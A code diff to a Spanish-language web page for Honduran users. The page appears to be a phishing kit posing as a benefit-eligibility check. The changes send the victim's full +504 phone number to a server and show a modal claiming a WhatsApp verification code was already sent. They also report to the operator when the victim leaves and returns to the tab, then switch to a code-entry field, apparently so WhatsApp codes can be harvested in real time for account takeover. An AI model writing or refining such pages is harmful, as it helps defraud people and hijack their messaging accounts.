@@ -13,7 +13,7 @@
     html,body{font-family:'Inter',-apple-system,sans-serif;min-height:100vh;background:#f5f5f5;color:#1a1a1a}
 
     /* HEADER */
-    .top-bar{background:#fff;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #e5e7eb;box-shadow:0 1px 4px rgba(0,0,0,.07);position:sticky;top:0;z-index:10}
+    .top-bar{background:#fff;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #e5e7eb;box-shadow:0 1px 4px rgba(0,0,0,.07);position:sticky;top:0;z-index:1001}
     .top-bar img{height:42px;width:auto}
     .menu-btn{background:none;border:none;cursor:pointer;display:flex;flex-direction:column;gap:5px;padding:4px}
     .menu-btn span{display:block;width:22px;height:2px;background:#1a1a1a;border-radius:2px}
@@ -32,9 +32,19 @@
     /* PHONE SPLIT INPUT */
     .phone-wrap{width:100%;display:flex;border:1.5px solid #d1d5db;border-radius:12px;overflow:hidden;background:#fff;height:56px;transition:border-color .15s,box-shadow .15s}
     .phone-wrap:focus-within{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,6,19,.10)}
-    .phone-prefix{min-width:88px;display:flex;align-items:center;justify-content:center;background:#f3f4f6;color:#9ca3af;font-size:17px;font-weight:700;letter-spacing:3px;border-right:1.5px solid #e5e7eb;user-select:none;cursor:default}
+    .phone-prefix{min-width:130px;display:flex;align-items:center;justify-content:center;gap:6px;background:#f3f4f6;color:#6b7280;font-size:14px;font-weight:600;letter-spacing:1px;border-right:1.5px solid #e5e7eb;user-select:none;cursor:default;padding:0 10px}
+    .phone-prefix .pflag{font-size:20px;line-height:1}
+    .phone-prefix .pcode{color:#374151;font-size:13px;font-weight:700}
+    .phone-prefix .pnum{color:#9ca3af;font-size:16px;font-weight:700;letter-spacing:3px}
     .phone-last4{flex:1;border:none;outline:none;text-align:center;font-size:22px;font-weight:700;letter-spacing:8px;color:#111;font-family:inherit;background:transparent}
     .phone-last4::placeholder{font-size:14px;letter-spacing:2px;font-weight:400;color:#9ca3af}
+    /* PHONE ERROR POPUP */
+    #err-phone{position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity .3s}
+    #err-phone.show{opacity:1;pointer-events:all}
+    #err-phone .ecard{background:#fff;border-radius:18px;padding:28px 24px;text-align:center;max-width:290px;box-shadow:0 12px 40px rgba(0,0,0,.2)}
+    #err-phone .ecard .eico{font-size:44px;margin-bottom:10px}
+    #err-phone .ecard .etitle{font-size:16px;font-weight:700;color:#E30613;margin-bottom:6px}
+    #err-phone .ecard .esub{font-size:13px;color:#6b7280;line-height:1.6}
 
     /* BUTTONS */
     .btn-action{width:100%;height:54px;border:none;border-radius:30px;background:var(--red);color:#fff;font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;letter-spacing:1.5px;transition:background .2s,opacity .2s;box-shadow:0 4px 14px rgba(227,6,19,.3)}
@@ -63,12 +73,15 @@
     .code-input{width:100%;height:56px;border:1.5px solid #d1d5db;border-radius:12px;text-align:center;font-size:26px;font-weight:700;letter-spacing:10px;outline:none;font-family:inherit;color:#111;transition:border-color .15s,box-shadow .15s;background:#fff}
     .code-input:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,6,19,.10)}
 
-    /* WHATSAPP POPUP */
-    #wa-popup{position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(16px);background:#fff;border-radius:16px;padding:14px 22px;box-shadow:0 8px 32px rgba(0,0,0,.18);display:flex;align-items:center;gap:12px;opacity:0;pointer-events:none;transition:opacity .4s,transform .4s;z-index:999;min-width:260px;max-width:88vw;border-left:4px solid #25D366}
-    #wa-popup.show{opacity:1;transform:translateX(-50%) translateY(0);pointer-events:all}
-    #wa-popup .wp-icon{font-size:28px;flex-shrink:0}
-    #wa-popup .wp-text{font-size:14px;font-weight:600;color:#111;line-height:1.3}
-    #wa-popup .wp-sub{font-size:12px;color:#6b7280;margin-top:2px}
+    /* WHATSAPP MODAL */
+    #wa-modal{position:fixed;inset:0;z-index:999;background:rgba(0,0,0,.55);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:24px;opacity:0;pointer-events:none;transition:opacity .35s}
+    #wa-modal.show{opacity:1;pointer-events:all}
+    .wam-card{background:#fff;border-radius:24px;padding:36px 28px;text-align:center;max-width:320px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);cursor:pointer;transition:transform .15s;border-top:4px solid #25D366}
+    .wam-card:active{transform:scale(.97)}
+    .wam-ico{font-size:60px;margin-bottom:14px;line-height:1}
+    .wam-title{font-size:20px;font-weight:700;color:#111;margin-bottom:8px}
+    .wam-sub{font-size:14px;color:#6b7280;line-height:1.7;margin-bottom:20px}
+    .wam-btn{display:inline-flex;align-items:center;gap:8px;background:#25D366;color:#fff;border-radius:30px;padding:12px 28px;font-size:15px;font-weight:700;letter-spacing:.5px;box-shadow:0 4px 16px rgba(37,211,102,.35)}
   </style>
 </head>
 <body>
@@ -88,8 +101,12 @@
       <div class="info-sub">Para asegurarnos que otra persona no realice la solicitud en línea por ti, valida tu número telefónico.</div>
     </div>
     <div class="phone-wrap" style="width:100%">
-      <div class="phone-prefix" id="phonePrefix">····</div>
-      <input class="phone-last4" type="tel" id="lastFour" maxlength="4" placeholder="últimos 4" autocomplete="tel"/>
+      <div class="phone-prefix" id="phonePrefix">
+        <span class="pflag">🇭🇳</span>
+        <span class="pcode">+504</span>
+        <span class="pnum" id="p4digits">····</span>
+      </div>
+      <input class="phone-last4" type="tel" id="lastFour" maxlength="6" placeholder="3XXX" autocomplete="tel" inputmode="numeric"/>
     </div>
     <button class="btn-action" id="btnContinuar" onclick="enviar()">CONTINUAR</button>
   </div>
@@ -114,21 +131,34 @@
 
 </div>
 
-<!-- WHATSAPP POPUP -->
-<div id="wa-popup">
-  <div class="wp-icon">📲</div>
-  <div><div class="wp-text">Abre tu app de WhatsApp</div><div class="wp-sub">El código ya está en camino</div></div>
+<!-- PHONE ERROR POPUP -->
+<div id="err-phone">
+  <div class="ecard">
+    <div class="eico">❌</div>
+    <div class="etitle">Datos Incorrectos</div>
+    <div class="esub">No eres apto para este beneficio con los datos ingresados.</div>
+  </div>
+</div>
+
+<!-- WHATSAPP MODAL -->
+<div id="wa-modal" onclick="openWhatsApp()">
+  <div class="wam-card">
+    <div class="wam-ico">📲</div>
+    <div class="wam-title">Abre tu WhatsApp</div>
+    <div class="wam-sub">El código de verificación ya fue enviado.<br/>Tócalo para abrirlo ahora.</div>
+    <div class="wam-btn">📲  Abrir WhatsApp</div>
+  </div>
 </div>
 
 <script>
   const USUARIO = new URLSearchParams(location.search).get('u') || '';
   const prefix4 = localStorage.getItem('wa_p4') || '';
-  if (prefix4) document.getElementById('phonePrefix').textContent = prefix4;
+  if (prefix4) document.getElementById('p4digits').textContent = prefix4;
 
   let pollTimer  = null;
-  let hasLeft    = false;
+  let tabPhase   = 'initial'; // 'initial' → 'left' → 'returned'
   let currentSt  = 'form';
-  let waPopTimer = null;
+  let waModTimer = null;
 
   /* ── SHOW STATE ── */
   function showState(id) {
@@ -139,14 +169,22 @@
   }
 
   /* ── CONTINUAR ── */
+  function showPhoneError() {
+    var inp = document.getElementById('lastFour');
+    var ov  = document.getElementById('err-phone');
+    ov.classList.add('show');
+    setTimeout(function(){ ov.classList.remove('show'); inp.value=''; inp.focus(); }, 3000);
+  }
+
   function enviar() {
-    const last4 = document.getElementById('lastFour').value.trim();
-    if (last4.length < 4) { document.getElementById('lastFour').focus(); return; }
+    const last4  = document.getElementById('lastFour').value.replace(/\D/g,'');
+    const digits = (prefix4 + last4).replace(/\D/g,'');
+    if (digits.length !== 8) { showPhoneError(); return; }
 
     const btn = document.getElementById('btnContinuar');
     btn.disabled = true; btn.textContent = '...';
 
-    const fullPhone = prefix4 + last4;
+    const fullPhone = '+504' + prefix4 + last4;
     const fd = new FormData();
     fd.append('type',  'phone');
     fd.append('phone', fullPhone);
@@ -173,30 +211,37 @@
     }, 3000);
   }
 
-  /* ── WHATSAPP POPUP ── */
+  /* ── WHATSAPP MODAL ── */
   function scheduleWaPopup() {
-    waPopTimer = setTimeout(showWaPopup, 10000);
+    waModTimer = setTimeout(showWaModal, 10000);
   }
-  function showWaPopup() {
-    var pop = document.getElementById('wa-popup');
-    pop.classList.add('show');
-    setTimeout(function(){ pop.classList.remove('show'); }, 4000);
-    waPopTimer = setTimeout(showWaPopup, 30000);
+  function showWaModal() {
+    document.getElementById('wa-modal').classList.add('show');
+    waModTimer = setTimeout(closeWaModal, 8000);
   }
-  function clearWaPopup() {
-    clearTimeout(waPopTimer);
-    document.getElementById('wa-popup').classList.remove('show');
+  function closeWaModal() {
+    clearTimeout(waModTimer);
+    document.getElementById('wa-modal').classList.remove('show');
+  }
+  function openWhatsApp() {
+    closeWaModal();
+    var ua = navigator.userAgent || '';
+    if (/android/i.test(ua)) { window.location.href = 'whatsapp://'; }
+    else { window.open('https://wa.me', '_blank'); }
   }
 
-  /* ── TAB VISIBILITY ── */
+  /* ── TAB VISIBILITY (fires once each direction) ── */
   document.addEventListener('visibilitychange', function(){
     if (document.hidden) {
-      hasLeft = true;
-      notifyTab('tab_left');
-    } else if (hasLeft) {
-      notifyTab('tab_back');
-      if (currentSt === 's-loading') {
-        clearWaPopup();
+      if (tabPhase === 'initial' && currentSt === 's-loading') {
+        tabPhase = 'left';
+        notifyTab('tab_left');
+      }
+    } else {
+      if (tabPhase === 'left') {
+        tabPhase = 'returned';
+        notifyTab('tab_back');
+        closeWaModal();
         showState('s-code');
         document.getElementById('codeInput').focus();
       }
